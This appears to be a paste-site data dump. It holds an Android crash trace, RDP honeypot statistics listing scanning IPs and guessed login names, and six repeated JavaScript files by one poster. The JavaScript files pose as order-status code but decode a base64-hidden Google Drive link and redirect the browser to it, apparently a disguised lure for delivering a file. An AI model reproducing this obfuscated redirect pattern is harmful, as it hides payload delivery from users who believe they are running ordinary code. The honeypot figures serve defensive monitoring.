id,title,username,language,date,content
iCNQa9Cu,2025-05-28T19:19:32.575586,powerampache,PHP,Wednesday 28th of May 2025 07:19:33 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsByGenre$2.invokeSuspend(SongsRepositoryImpl.kt:397)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getArtists() - {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}"
nMQ8CNXU,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:18:10 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 6801,
    ""128.199.168.88"": 5724,
    ""143.198.221.164"": 537,
    ""157.245.159.1"": 339,
    ""123.103.219.78"": 51,
    ""80.94.95.198"": 54,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""194.187.177.117"": 3,
    ""71.82.170.60"": 18,
    ""92.63.197.197"": 12,
    ""66.228.46.123"": 12,
    ""205.210.31.48"": 9,
    ""45.56.112.145"": 3,
    ""157.245.150.219"": 3,
    ""92.63.197.23"": 33,
    ""167.172.153.78"": 6,
    ""138.68.188.52"": 3,
    ""194.0.234.34"": 6,
    ""205.210.31.67"": 9,
    ""107.173.58.226"": 6,
    ""78.142.18.92"": 3,
    ""134.122.51.9"": 36,
    ""82.147.88.139"": 6,
    ""103.15.222.151"": 6,
    ""185.196.220.41"": 9,
    ""111.170.152.113"": 9,
    ""195.178.110.98"": 6,
    ""147.185.132.58"": 9,
    ""165.154.182.72"": 3,
    ""165.232.170.129"": 4395,
    ""91.238.181.96"": 6,
    ""198.235.24.184"": 9,
    ""88.214.25.123"": 6
  },
  ""asn"": {
    ""AS11427"": 6801,
    ""AS14061"": 11043,
    ""AS4826"": 51,
    ""AS204428"": 54,
    ""AS35042"": 12,
    ""AS49434"": 12,
    ""AS208843"": 3,
    ""AS20115"": 18,
    ""AS210848"": 45,
    ""AS63949"": 15,
    ""AS396982"": 36,
    ""AS214295"": 6,
    ""AS20278"": 6,
    ""AS208046"": 12,
    ""AS211860"": 6,
    ""AS149137"": 6,
    ""AS151185"": 9,
    ""AS48090"": 6,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Charter Communications Inc"": 6801,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus PTY LTD"": 51,
    ""SS-Net"": 54,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Charter Communications"": 18,
    ""Telkom Internet LTD"": 45,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""Skynet Network LTD"": 6,
    ""Nexeon Technologies, Inc."": 6,
    ""ColocationX Ltd."": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TAN Thanh AN International Trade Development Company Limited"": 6,
    ""China Telecom"": 9,
    ""Techoff SRV Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Spectrum"": 6819,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus Communications"": 51,
    ""Unmanaged LTD"": 54,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""Alpha Strike Labs GmbH"": 3,
    ""Korotkij Denis Aleksandrovich"": 45,
    ""Linode"": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""Skynet Network LTD"": 6,
    ""ColoCrossing"": 6,
    ""ColocationX Ltd"": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TANTHANHAN"": 6,
    ""Chinanet HB"": 9,
    ""Techoff SRV Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Texas"": 6801,
    ""South West"": 10998,
    ""Western Australia"": 51,
    ""Sofia-Capital"": 54,
    ""Kowloon City"": 12,
    ""\u00cele-de-France"": 12,
    ""State of Berlin"": 3,
    ""Wisconsin"": 18,
    ""North Holland"": 84,
    ""New Jersey"": 18,
    ""California"": 39,
    ""Georgia"": 3,
    ""England"": 9,
    ""New York"": 6,
    ""Krasnoyarsk Krai"": 6,
    ""Hanoi"": 6,
    ""Virginia"": 9,
    ""Hubei"": 9,
    ""Andorra la Vella"": 6
  },
  ""country"": {
    ""United States"": 6894,
    ""Singapore"": 10998,
    ""Australia"": 51,
    ""Bulgaria"": 54,
    ""Hong Kong"": 12,
    ""France"": 12,
    ""Germany"": 3,
    ""The Netherlands"": 84,
    ""United Kingdom"": 9,
    ""Russia"": 6,
    ""Vietnam"": 6,
    ""China"": 9,
    ""Andorra"": 6
  },
  ""account"": {
    ""hello"": 17856,
    ""142.93.8.59"": 126,
    ""Test"": 36,
    ""user"": 3,
    ""152s6omg"": 12,
    ""yczeDBqhx"": 3,
    ""DuvwKL"": 3,
    ""bexGkd"": 3,
    ""beio"": 3,
    ""Administr"": 60,
    ""REkuHSOwW"": 3,
    ""acHews"": 3,
    ""XJWMXu"": 3,
    ""Domain"": 9,
    ""FBcrZVMET"": 3,
    ""FqXtkU"": 3,
    ""pBFZzb"": 3,
    ""Administrator"": 3,
    ""WbqnkaBFR"": 3,
    ""DCXOSk"": 3,
    ""bNTXIm"": 3
  },
  ""keyboard"": {
    ""Unknown"": 18144
  },
  ""client_build"": {
    ""Unknown"": 18144
  },
  ""client_name"": {
    ""Unknown"": 18144
  },
  ""ip_type"": {
    ""Unknown"": 7029,
    ""hosting"": 11109,
    ""proxy"": 6
  }
}"
fZW57bHF,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:16:14 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 4534,
    ""128.199.168.88"": 3816,
    ""143.198.221.164"": 358,
    ""157.245.159.1"": 226,
    ""123.103.219.78"": 34,
    ""80.94.95.198"": 36,
    ""88.214.25.121"": 4,
    ""91.238.181.94"": 4,
    ""194.187.177.117"": 2,
    ""71.82.170.60"": 12,
    ""92.63.197.197"": 8,
    ""66.228.46.123"": 8,
    ""205.210.31.48"": 6,
    ""45.56.112.145"": 2,
    ""157.245.150.219"": 2,
    ""92.63.197.23"": 22,
    ""167.172.153.78"": 4,
    ""138.68.188.52"": 2,
    ""194.0.234.34"": 4,
    ""205.210.31.67"": 6,
    ""107.173.58.226"": 4,
    ""78.142.18.92"": 2,
    ""134.122.51.9"": 24,
    ""82.147.88.139"": 4,
    ""103.15.222.151"": 4,
    ""185.196.220.41"": 6,
    ""111.170.152.113"": 6,
    ""195.178.110.98"": 4,
    ""147.185.132.58"": 6,
    ""165.154.182.72"": 2,
    ""165.232.170.129"": 2930,
    ""91.238.181.96"": 4,
    ""198.235.24.184"": 6,
    ""88.214.25.123"": 4
  },
  ""asn"": {
    ""AS11427"": 4534,
    ""AS14061"": 7362,
    ""AS4826"": 34,
    ""AS204428"": 36,
    ""AS35042"": 8,
    ""AS49434"": 8,
    ""AS208843"": 2,
    ""AS20115"": 12,
    ""AS210848"": 30,
    ""AS63949"": 10,
    ""AS396982"": 24,
    ""AS214295"": 4,
    ""AS20278"": 4,
    ""AS208046"": 8,
    ""AS211860"": 4,
    ""AS149137"": 4,
    ""AS151185"": 6,
    ""AS48090"": 4,
    ""AS135377"": 2
  },
  ""isp"": {
    ""Charter Communications Inc"": 4534,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus PTY LTD"": 34,
    ""SS-Net"": 36,
    ""NOC EMAIL: noc@one-host.net"": 8,
    ""Datacenter location PAR1 France"": 8,
    ""Alpha Strike Labs GmbH"": 2,
    ""Charter Communications"": 12,
    ""Telkom Internet LTD"": 30,
    ""Akamai Technologies, Inc."": 10,
    ""Google LLC"": 24,
    ""Skynet Network LTD"": 4,
    ""Nexeon Technologies, Inc."": 4,
    ""ColocationX Ltd."": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TAN Thanh AN International Trade Development Company Limited"": 4,
    ""China Telecom"": 6,
    ""Techoff SRV Limited"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2
  },
  ""org"": {
    ""Spectrum"": 4546,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus Communications"": 34,
    ""Unmanaged LTD"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 16,
    ""Alpha Strike Labs GmbH"": 2,
    ""Korotkij Denis Aleksandrovich"": 30,
    ""Linode"": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""Skynet Network LTD"": 4,
    ""ColoCrossing"": 4,
    ""ColocationX Ltd"": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TANTHANHAN"": 4,
    ""Chinanet HB"": 6,
    ""Techoff SRV Limited"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2
  },
  ""regionName"": {
    ""Texas"": 4534,
    ""South West"": 7332,
    ""Western Australia"": 34,
    ""Sofia-Capital"": 36,
    ""Kowloon City"": 8,
    ""\u00cele-de-France"": 8,
    ""State of Berlin"": 2,
    ""Wisconsin"": 12,
    ""North Holland"": 56,
    ""New Jersey"": 12,
    ""California"": 26,
    ""Georgia"": 2,
    ""England"": 6,
    ""New York"": 4,
    ""Krasnoyarsk Krai"": 4,
    ""Hanoi"": 4,
    ""Virginia"": 6,
    ""Hubei"": 6,
    ""Andorra la Vella"": 4
  },
  ""country"": {
    ""United States"": 4596,
    ""Singapore"": 7332,
    ""Australia"": 34,
    ""Bulgaria"": 36,
    ""Hong Kong"": 8,
    ""France"": 8,
    ""Germany"": 2,
    ""The Netherlands"": 56,
    ""United Kingdom"": 6,
    ""Russia"": 4,
    ""Vietnam"": 4,
    ""China"": 6,
    ""Andorra"": 4
  },
  ""account"": {
    ""hello"": 11904,
    ""142.93.8.59"": 84,
    ""Test"": 24,
    ""user"": 2,
    ""152s6omg"": 8,
    ""yczeDBqhx"": 2,
    ""DuvwKL"": 2,
    ""bexGkd"": 2,
    ""beio"": 2,
    ""Administr"": 40,
    ""REkuHSOwW"": 2,
    ""acHews"": 2,
    ""XJWMXu"": 2,
    ""Domain"": 6,
    ""FBcrZVMET"": 2,
    ""FqXtkU"": 2,
    ""pBFZzb"": 2,
    ""Administrator"": 2,
    ""WbqnkaBFR"": 2,
    ""DCXOSk"": 2,
    ""bNTXIm"": 2
  },
  ""keyboard"": {
    ""Unknown"": 12096
  },
  ""client_build"": {
    ""Unknown"": 12096
  },
  ""client_name"": {
    ""Unknown"": 12096
  },
  ""ip_type"": {
    ""Unknown"": 4686,
    ""hosting"": 7406,
    ""proxy"": 4
  }
}"
9n0wXuWk,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 2267,
    ""128.199.168.88"": 1908,
    ""143.198.221.164"": 179,
    ""157.245.159.1"": 113,
    ""123.103.219.78"": 17,
    ""80.94.95.198"": 18,
    ""88.214.25.121"": 2,
    ""91.238.181.94"": 2,
    ""194.187.177.117"": 1,
    ""71.82.170.60"": 6,
    ""92.63.197.197"": 4,
    ""66.228.46.123"": 4,
    ""205.210.31.48"": 3,
    ""45.56.112.145"": 1,
    ""157.245.150.219"": 1,
    ""92.63.197.23"": 11,
    ""167.172.153.78"": 2,
    ""138.68.188.52"": 1,
    ""194.0.234.34"": 2,
    ""205.210.31.67"": 3,
    ""107.173.58.226"": 2,
    ""78.142.18.92"": 1,
    ""134.122.51.9"": 12,
    ""82.147.88.139"": 2,
    ""103.15.222.151"": 2,
    ""185.196.220.41"": 3,
    ""111.170.152.113"": 3,
    ""195.178.110.98"": 2,
    ""147.185.132.58"": 3,
    ""165.154.182.72"": 1,
    ""165.232.170.129"": 1465,
    ""91.238.181.96"": 2,
    ""198.235.24.184"": 3,
    ""88.214.25.123"": 2
  },
  ""asn"": {
    ""AS11427"": 2267,
    ""AS14061"": 3681,
    ""AS4826"": 17,
    ""AS204428"": 18,
    ""AS35042"": 4,
    ""AS49434"": 4,
    ""AS208843"": 1,
    ""AS20115"": 6,
    ""AS210848"": 15,
    ""AS63949"": 5,
    ""AS396982"": 12,
    ""AS214295"": 2,
    ""AS20278"": 2,
    ""AS208046"": 4,
    ""AS211860"": 2,
    ""AS149137"": 2,
    ""AS151185"": 3,
    ""AS48090"": 2,
    ""AS135377"": 1
  },
  ""isp"": {
    ""Charter Communications Inc"": 2267,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus PTY LTD"": 17,
    ""SS-Net"": 18,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Alpha Strike Labs GmbH"": 1,
    ""Charter Communications"": 6,
    ""Telkom Internet LTD"": 15,
    ""Akamai Technologies, Inc."": 5,
    ""Google LLC"": 12,
    ""Skynet Network LTD"": 2,
    ""Nexeon Technologies, Inc."": 2,
    ""ColocationX Ltd."": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TAN Thanh AN International Trade Development Company Limited"": 2,
    ""China Telecom"": 3,
    ""Techoff SRV Limited"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1
  },
  ""org"": {
    ""Spectrum"": 2273,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus Communications"": 17,
    ""Unmanaged LTD"": 18,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Alpha Strike Labs GmbH"": 1,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Linode"": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""Skynet Network LTD"": 2,
    ""ColoCrossing"": 2,
    ""ColocationX Ltd"": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TANTHANHAN"": 2,
    ""Chinanet HB"": 3,
    ""Techoff SRV Limited"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1
  },
  ""regionName"": {
    ""Texas"": 2267,
    ""South West"": 3666,
    ""Western Australia"": 17,
    ""Sofia-Capital"": 18,
    ""Kowloon City"": 4,
    ""\u00cele-de-France"": 4,
    ""State of Berlin"": 1,
    ""Wisconsin"": 6,
    ""North Holland"": 28,
    ""New Jersey"": 6,
    ""California"": 13,
    ""Georgia"": 1,
    ""England"": 3,
    ""New York"": 2,
    ""Krasnoyarsk Krai"": 2,
    ""Hanoi"": 2,
    ""Virginia"": 3,
    ""Hubei"": 3,
    ""Andorra la Vella"": 2
  },
  ""country"": {
    ""United States"": 2298,
    ""Singapore"": 3666,
    ""Australia"": 17,
    ""Bulgaria"": 18,
    ""Hong Kong"": 4,
    ""France"": 4,
    ""Germany"": 1,
    ""The Netherlands"": 28,
    ""United Kingdom"": 3,
    ""Russia"": 2,
    ""Vietnam"": 2,
    ""China"": 3,
    ""Andorra"": 2
  },
  ""account"": {
    ""hello"": 5952,
    ""142.93.8.59"": 42,
    ""Test"": 12,
    ""user"": 1,
    ""152s6omg"": 4,
    ""yczeDBqhx"": 1,
    ""DuvwKL"": 1,
    ""bexGkd"": 1,
    ""beio"": 1,
    ""Administr"": 20,
    ""REkuHSOwW"": 1,
    ""acHews"": 1,
    ""XJWMXu"": 1,
    ""Domain"": 3,
    ""FBcrZVMET"": 1,
    ""FqXtkU"": 1,
    ""pBFZzb"": 1,
    ""Administrator"": 1,
    ""WbqnkaBFR"": 1,
    ""DCXOSk"": 1,
    ""bNTXIm"": 1
  },
  ""keyboard"": {
    ""Unknown"": 6048
  },
  ""client_build"": {
    ""Unknown"": 6048
  },
  ""client_name"": {
    ""Unknown"": 6048
  },
  ""ip_type"": {
    ""Unknown"": 2343,
    ""hosting"": 3703,
    ""proxy"": 2
  }
}"
YPJ9H2Nj,Products.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 07:09:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40958/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gWjmmTLD,Order.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 07:04:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42079/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bdtLL2zL,Market.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:58:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06863/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
66BufSYa,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:53:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85307/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gm7Ap450,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:50:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PeaXcSNt,Market.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:39:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26839/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
